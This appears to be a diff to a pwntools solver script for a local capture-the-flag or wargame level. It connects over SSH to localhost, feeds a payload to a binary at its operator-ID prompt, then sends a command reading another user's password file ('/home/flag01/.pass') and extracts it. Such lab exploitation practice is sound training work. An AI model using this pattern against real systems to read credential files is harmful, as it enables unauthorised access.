@@ -1,33 +1,15 @@
 from pwn import *
 
-def run_level(user, pwd, binary_name):
+def run_level(user, pwd, binary_name, payload):
+    connection = ssh(host="localhost", user=user, password=pwd, port=4242, timeout=10)
+    sh = connection.process(['/usr/bin/bash', '-c', f'ulimit -c 0; exec ./{binary_name}'], env={})
 
-    connection = ssh(host="localhost", user=user, password=pwd, port=4242)
-    sh = connection.process("/bin/bash") # sh = bash at the home user
+    sh.recvuntil(b"Waiting for operator ID:")
+    sh.sendline(payload)
 
-
-    # output = sh.recvall(timeout=2) 
-
-
-    sh.sendline(f"./{binary_name}".encode())
-
-    # payload
-    sh.sendline(b"test")
-
-
-    
-
-    # sh.interactive()
-
-
-
-
-
-
-
-
-
+    sh.sendline(b"cat /home/flag01/.pass;exit")
+    output = sh.recvall(timeout=1).decode(errors="replace")
 
     sh.close()
     connection.close()
-    return "chaussure"
+    return output.splitlines()[1][4:]
